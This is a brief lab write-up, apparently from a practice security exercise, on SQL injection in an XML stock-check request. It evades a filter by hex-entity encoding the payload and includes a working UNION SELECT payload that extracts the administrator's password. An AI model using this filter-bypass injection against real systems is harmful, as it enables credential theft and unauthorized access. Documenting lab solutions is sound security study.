---
tags:
  - sqli
  - xml-encoding
  - filter-bypass
---
# SQL injection with filter bypass via XML encoding

1. View any product and check the stock. Observe the request contains an XML payload in the body
2. Inject a single quote and note the response "Attack detected"

![[attachments/sqli-lab-18/file-20260204143755322.png]]

3. Using hackvertor, enclose the payload with `<@hex_entities>`
4. Send the following payload to get the password

```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId><@hex_entities>1 UNION SELECT username||'-'||password FROM users WHERE username='administrator'--</@hex_entities></storeId></stockCheck>
```

![[attachments/sqli-lab-18/file-20260204144221564.png]]

5. Log in as the admin to solve the lab

